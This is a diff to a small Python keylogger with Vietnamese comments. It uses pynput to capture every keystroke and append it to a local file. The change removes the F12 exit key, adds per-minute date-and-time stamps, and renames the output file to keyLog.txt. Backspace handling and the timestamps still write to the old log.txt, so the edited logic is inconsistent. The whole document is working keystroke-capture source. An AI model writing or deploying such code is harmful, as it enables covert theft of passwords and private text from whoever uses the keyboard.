@@ -1,20 +1,22 @@
 from pynput.keyboard import Listener
 import os
+import time
+from datetime import date
 
 # * Khởi tạo biến capslockIsOn
 capslockIsOn = False
+
+# * Thời gian
+current_time = ""
 
 def anonymous(key):
     # * Dữ liệu nhập vào
     key = str(key)
     key = key.replace("'", "")
     
-    # * Chương trình sẽ tắt khi gõ phím F12
-    if key == "Key.f12":
-        raise SystemExit(0)
-    
-    # * Khai báo capslockIsOn là biến toàn cục
+    # * Khai báo capslockIsOn và biến current_time là biến toàn cục
     global capslockIsOn
+    global current_time
     
     # * Bàn phím bên trái:
     if key == "Key.esc":
@@ -41,6 +43,8 @@ def anonymous(key):
         key = ""
     if key == "Key.f11":
         key = ""
+    if key == "Key.f12":
+        key = ""
     if key == "Key.insert":
         key = ""
     if key == "Key.delete":
@@ -48,15 +52,15 @@ def anonymous(key):
     if key == "[`]":
         key = "`"
     
-    # * Khi gõ backspace thì sẽ xóa một ký tự trong file log.txt
+    # * Xóa một ký tự trong file khi gõ Backspace
     if key == "Key.backspace":
         key = ""
         with open("log.txt", 'rb+') as file:
             file.seek(-1, os.SEEK_END)
             file.truncate()
-    
+
     if key == "Key.tab":
-        key = " tab\n "
+        key = " \n "
     
     # * Khi nhấn caps_lock thì sẽ thay đổi giá trị biến capslockIsOn
     if key == "Key.caps_lock":
@@ -67,7 +71,7 @@ def anonymous(key):
         key = ""
     
     if key == "Key.enter":
-        key = " enter\n "
+        key = " \n "
     if key == "Key.shift" or key == "Key.shift_r":
         key = ""
     if key == "Key.ctrl_l" or key == "Key.ctrl_r":
@@ -77,13 +81,13 @@ def anonymous(key):
     if key == "Key.cmd":
         key = ""
     if key == "Key.up":
-        key = " up "
+        key = ""
     if key == "Key.down":
-        key = " down "
+        key = ""
     if key == "Key.left":
-        key = " left "
+        key = ""
     if key == "Key.right":
-        key = " right " 
+        key = "" 
     if key == "Key.page_up":
         key = ""
     if key == "Key.page_down":
@@ -123,8 +127,17 @@ def anonymous(key):
     if capslockIsOn == True:
         key = key.upper()
 
+    # * Hàm in phút
+    t = time.localtime()
+    today = date.today()
+    today = str(today)
+    if current_time != time.strftime("%H:%M", t):
+        current_time = time.strftime("%H:%M", t)
+        with open("log.txt", "a") as file:
+            file.write(" \n\n [" + today + " " + current_time + "]: \n ") 
+
     # * Chỉnh sửa phần này thành file muốn in ra
-    with open("log.txt", "a") as file:
+    with open("keyLog.txt", "a") as file:
         file.write(key)
 
 with Listener(on_press = anonymous) as listener:
